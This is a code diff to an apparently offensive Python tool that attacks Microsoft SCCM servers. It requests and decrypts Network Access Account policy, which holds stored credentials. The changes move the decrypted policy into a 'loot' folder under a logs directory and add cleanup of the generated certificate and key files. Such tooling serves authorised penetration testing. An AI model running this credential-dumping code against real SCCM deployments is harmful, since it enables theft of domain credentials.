@@ -119,13 +119,14 @@ class CryptoTools:
 
 class SCCMTools():
 
-    def __init__(self, target_name, target_fqdn, target_sccm, target_username, target_password):
+    def __init__(self, target_name, target_fqdn, target_sccm, target_username, target_password, logs_dir):
         self._server = target_sccm
         self._serverURI = f"http://{self._server}"
         self._target_name = target_name
         self._target_fqdn = target_fqdn
         self.target_username = target_username
         self.target_password = target_password
+        self.logs_dir = logs_dir
 
     def sendCCMPostRequest(self, data, auth=False, username="", password=""):
         headers = {
@@ -248,6 +249,11 @@ class SCCMTools():
         decrypted = CryptoTools.decrypt3Des(self.key, encryptedRSAKey, iv, body)
         policy = decrypted.decode('utf-16')
         return policy
+    
+    def cleanupCertifcate(self, remove):
+       if remove:
+          os.remove("certificate.pem")
+          os.remove("key.pem")
 
     def sccmwtf_run(self):
 
@@ -275,10 +281,11 @@ class SCCMTools():
                 try:
                     result = self.requestPolicy(url, uuid, True, True)
                     decryptedResult = self.parseEncryptedPolicy(result)
-                    Tools.write_to_file(decryptedResult, f"{os.getcwd()}/{self._server.split('.')[0]}_naapolicy.xml")
-                    logger.info(f"[+] Done.. decrypted policy dumped to {os.getcwd()}/{self._server.split('.')[0]}_naapolicy.xml")
+                    Tools.write_to_file(decryptedResult, f"{self.logs_dir}/loot/{self._server.split('.')[0]}_naapolicy.xml")
+                    logger.info(f"[+] Done.. decrypted policy dumped to {self.logs_dir}/loot/{self._server.split('.')[0]}_naapolicy.xml")
                 except:
                    logger.info(f"[-] Something went wrong.")
+        self.cleanupCertifcate(True)
 
 
 
